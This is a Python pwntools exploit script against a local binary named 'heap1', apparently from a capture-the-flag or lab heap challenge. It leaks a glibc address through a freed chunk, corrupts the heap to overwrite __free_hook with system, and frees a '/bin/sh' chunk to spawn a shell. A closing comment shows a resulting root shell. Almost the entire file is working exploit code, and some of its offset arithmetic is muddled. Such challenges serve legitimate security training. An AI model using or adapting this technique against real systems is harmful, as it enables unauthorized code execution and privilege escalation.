from pwn import *
binary_name = './heap1'

def malloc(indx, size, payload):
    global r
    r.sendlineafter(b"\n> ","1")
    r.sendlineafter(b"Index: \n",str(indx))
    r.sendlineafter(b"Size: \n",str(size))
    r.sendlineafter(b"Data\n",payload)

def free(indx):
    global r
    r.sendlineafter(b"\n> ","3")
    r.sendlineafter(b"Index\n",str(indx))

def show(indx):
	global r
	r.sendlineafter(b"\n> ","2")
	r.sendlineafter(b"Index\n",str(indx))
	return r.recvuntil("1. ")

elf = ELF(binary_name)
r = process(binary_name)
libc = elf.libc

print(r.pid)
r.sendline("gabe")

malloc(0,1592, "AAAAAA")
malloc(1,24, "BBBBBBB")
# \xe8\xa5\xf8V
free(0)


leak1 = show(0)
leak1 = u64(leak1[:leak1.find(b"1.")].ljust(8,b"\x00"))
print("glibc leak : ", hex(leak1))
begin = 0x00007f56f8664000
# take the difference to find the beginning of glibc to find free hook

target = leak1 + 102
print(hex(target))

malloc(2, 0x68, "fart")
for _ in range(11):
    malloc(3, 0x68, "gabe")

# what is our target? 
malloc(2, 1592, p64(target))
malloc(3, 1592, p64(11*0x700 + 1))
offset = leak1 - begin

libc.address = leak1 - offset
print("Beginning of glibc: " , hex(libc.address))


malloc(3, 56, p64(libc.sym.__free_hook))
malloc(4, 56, p64(libc.sym.system))

malloc(5, 18, b'/bin/sh\x00')
free(5)

r.interactive()

'''
$ls
secsoft heap1 
$ whoami
root
'''